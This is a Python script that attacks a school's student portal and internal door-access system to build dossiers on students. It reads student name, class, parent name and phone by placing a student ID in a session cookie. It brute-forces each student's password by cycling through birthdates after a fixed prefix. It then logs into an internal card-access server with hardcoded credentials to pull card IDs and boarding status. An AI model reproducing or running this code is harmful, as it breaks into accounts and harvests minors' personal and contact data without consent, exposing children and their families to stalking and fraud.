import re
import traceback
import json

import pypinyin
import requests
from bs4 import BeautifulSoup
import base64
import sys

from pypinyin.phonetic_symbol import phonetic_symbol

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"

# this method is deprecated, use kcisinfo instead
def get_name_ordering(query_id):
    try:
        req = requests.get("https://ordering.kcisec.com/chaxun.asp?kahao=" + query_id)
        reqt = req.text.encode('iso-8859-1').decode('gbk')
        soup = BeautifulSoup(reqt, 'html.parser')
        body = soup.body
        table = body.find('table', width='800')
        td = table.find('td', align='center', valign='top')
        span = td.find('span')
        span_text = span.text
        if span is None or span_text == "无此帐户，或帐户已被锁定！":
            return
        name = re.sub(r"\[.*?](.+?) \d{4}/\d{1,2}/\d{1,2}.{4}", r"\1", span_text)
        # print("Get " + get_id + " = " + name)
        return name
    except requests.RequestException as e:
        print(f"Request error occurred when getting API for {query_id}: {e}")
        traceback.print_exc()
        return
    except Exception as e:
        print(f"An error occurred when processing the response for {query_id}: {e}")
        traceback.print_exc()
        return

# get chinese name, english name, class name, parent name, and phone number
def get_info(query_id : str):
    try:
        url = "https://portal.kcisec.com/DSAI/Form_StTraf/Form_FillPage?strFormKey="
        headers = {
            "Cookie": "DSAI=" + query_id,
            "User-Agent": user_agent,
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=1, i"
        }

        response = requests.get(url, headers=headers)

        if response.status_code != 200:
            print(f"Request failed when getting API for {query_id}: {response.status_code}")
            return

        soup = BeautifulSoup(response.text, 'html.parser')

        pattern = r"姓名：(.+)\((\w+)\).*?班级：(\w+).*?家长姓名：([\u4e00-\u9fa5a-zA-Z]*).*?联系电话：(.*?)\s"
        match = re.search(pattern, soup.get_text(), re.DOTALL)
        # print(soup.get_text())
        # exit()
        if match:
            #student_id = match.group(0)
            chinese_name = match.group(1)
            english_name = match.group(2)
            class_name = match.group(3)
            parent_name = match.group(4)
            if parent_name == "":
                # Cannot get parent name due to some reason (maybe data lost
                parent_name = None
            if re.match(r'^\d+$', match.group(5)):
                phone = match.group(5)
            else:
                # Cannot get phone due to some reason (maybe data lost
                phone = None

            return {
                "chinese_name": chinese_name,
                "english_name": english_name,
                "homeroom": class_name,
                "parent_name": parent_name,
                "phone": phone
            }
        else:
            return None
            #print(f"An error occurred when processing the response for {query_id}: No matching info found")

    except requests.RequestException as e:
        print(f"Request error occurred when getting API for {query_id}: {e}")
        traceback.print_exc()
        return
    except Exception as e:
        print(f"An error occurred when processing the response for {query_id}: {e}")
        traceback.print_exc()
        return

def get_password(query_id: str, min_year: int, max_year: int):
    url = "https://portal.kcisec.com/China/Account/LogInCheck"
    headers = {
        "Accept-Language" : "en-US",
        "User-Agent" : user_agent,
        "Sec-Ch-Ua-Mobile": "?0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    password_starting = "Kskq%"

    for yrs in range(min_year, max_year+1):
        for mth in range(1,13):
            mth_p = str(yrs) + str(mth).zfill(2)
            for days in range(1,32):
                birthday = mth_p + str(days).zfill(2)
                password = password_starting + birthday
                replace_printed_line("\rAttempting password of " + query_id + ": " + password)
                encoded_password = base64.b64encode(password.encode()).decode()
                d = {"UserID" : query_id, "Password" : encoded_password, "returnUrl" : ""}
                r = requests.get(url, data=d, headers=headers)
                dic = json.loads(r.text)
                if dic[0]["strStatus"] == "{ok}":
                    replace_printed_line("Successfully found password for " + query_id + ": " + password)
                    # print("successfully finished")
                    return birthday
    replace_printed_line("Failed to find password for " + query_id)
    return

def get_time_string(time):
    if time == 0:
        return "Calculating"
    if time < 1000:
        return str(round(time, 2)) + "ms"
    elif time < 60000:
        return str(round(time / 1000, 2)) + "s"
    elif time < 3600000:
        return str(round(time / 60000, 2)) + "min"
    else:
        return str(round(time / 3600000, 2)) + "h"


def get_card(query_id):
    id_api_login = {
        "__VIEWSTATE": "x1ykVo8PcxjJMD7IpydQTOx8DSN21FiuS2vASjpXoLpz/+NQ5ZEx+QIevk4txXWaRMIrMAno4Wax4XakQyZrMJ1XXZwJZE7aa6CJeT7jmRM=",
        "__VIEWSTATEGENERATOR": "D303DDCD",
        "__EVENTVALIDATION": "lNfwzAejWCsuq+h1Letxpqi1O2tnRW6aMpV4uRR2JCQEvUBNCLyb/pwlF1I8Q+5kWuRCyKEuao1r2a9jzOcP2YWxGK1XqDMYJ68gjiiVdvRTaBrlrjUs4Nm7eomGJ7ISa42aTheNinBSs+Qv+BI5kPOf8xA8VJS80G7xpzTe7Y4=",
        "ctl00$MainContent$txtUserName": "Liang_zhang",
        "ctl00$MainContent$txtPassword": "1234567890",
        "ctl00$MainContent$Button1": "%E7%99%BB%E5%85%A5"
    }
    id_api_headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        id_api = requests.session()
        id_api.post('http://192.168.80.106/DoorReport/Login.aspx', data=id_api_login, headers=id_api_headers)
        d = {
            '__LASTFOCUS': '',
            '__EVENTTARGET': 'ctl00$MainContent$TextBox_NoOrCard',
            '__EVENTARGUMENT': '',
            '__VIEWSTATE': 'QaD0l6zyqyvGYr+IUfLn1Ak8KDytRCpZvojKUiHbBVjlG2HTpmbVi3T3CjwkQBsdxUJJ1E68nMCkQtU2DRmYCGGmIErDog01zXKbNHBiCcInvsiKVQDowYCDEnghJn31JUPQDBTJDeN01EIzpCVD1yWWYQrw9QWP6RyW3ZdYyZmZursnyb+nPRaiB/ShCPT8aN4bZGEVdThNE5Cd00gUQav243h0nJf/NrAdKuX3sFU00+XsiTyXcsJrx/olHG1596pkTHnMR1oevmqrHIQJDjNRwP0WHCASspx258X9AGHbnA1q7zaW2uz+1z3ptYP7',
            '__VIEWSTATEGENERATOR': '0BF6F3BC',
            '__EVENTVALIDATION': 'q8vG4ykr3UqR2SKoRtU76FZhhzEhyAmWPa5+dedGz8RiZFG6W+0EITyiGG+0TiPAVqLpK2i1jBrOFyyFcAHarzzNs9Nb1YM07A+uHXI6ZFpnKqg/lhPxppOwA93GnoPdulsjMtSUW45QYh248npccw==',
            'ctl00$MainContent$TextBox_NoOrCard': query_id
        }
        id_api_main = id_api.post('http://192.168.80.106/DoorReport/Report_Access.aspx', data=d)
        #print(id_api_main.status_code)
        id_api_soup = BeautifulSoup(id_api_main.content, 'html.parser')
        result = id_api_soup.body.find('td', width='850px', valign='top').find('tr', bgcolor='#E3EAEB')
        if result is None:
            return None
        fonts = result.find_all('font')
        is_boarded = fonts[4].get_text() == '非走读生'
        do_stay_at_self_study = True if is_boarded else fonts[4].get_text() == '走读B'
        info = {
            "card_id": fonts[3].text,
            "is_boarded": is_boarded,
            "do_stay_at_self_study": do_stay_at_self_study
        }
        return info
    except requests.RequestException as e:
        print(f"Request error occurred when getting API for {query_id}: {e}")
        traceback.print_exc()
        return
    except Exception:
        print()
        traceback.print_exc()
        print("Error occurred when get API for "  + "!")
        print()
        return

def replace_printed_line(text):
    # sys.stdout.write('\r' + text)
    # sys.stdout.flush()
    print("\033[A" + text, end="")
    print()

def get_student_info(query_id : str, guess_min_year: int, guess_max_year: int):
    info = get_info(query_id)
    if info is None:
        replace_printed_line(
            f"Getting info for {query_id}: None")
        return None
    
    password = get_password(query_id, guess_min_year, guess_max_year)
    card = get_card(query_id)
    
    return to_student_info_dict(query_id, info, password, card)

def to_student_info_dict(query_id, info, password, card):
    replace_printed_line(
        f"Getting info for {query_id}: {info.get('chinese_name')}: {info.get('english_name')}"
    )
    print()

    py = pypinyin.slug(info["chinese_name"], style=pypinyin.Style.TONE3, separator=' ')
    return {
        "id": query_id,
        "chinese_name": info.get("chinese_name"),
        "pinyin": py,
        "english_name": info.get("english_name"),
        "homeroom": info.get("homeroom"),
        "parent_name": info.get("parent_name"),
        "phone": info.get("phone"),
        "birthday": password,
        "card_id": card.get('card_id'),
        "is_boarded": card.get('is_boarded'),
        "do_stay_at_self_study": card.get('do_stay_at_self_study'),
        "active": True
    }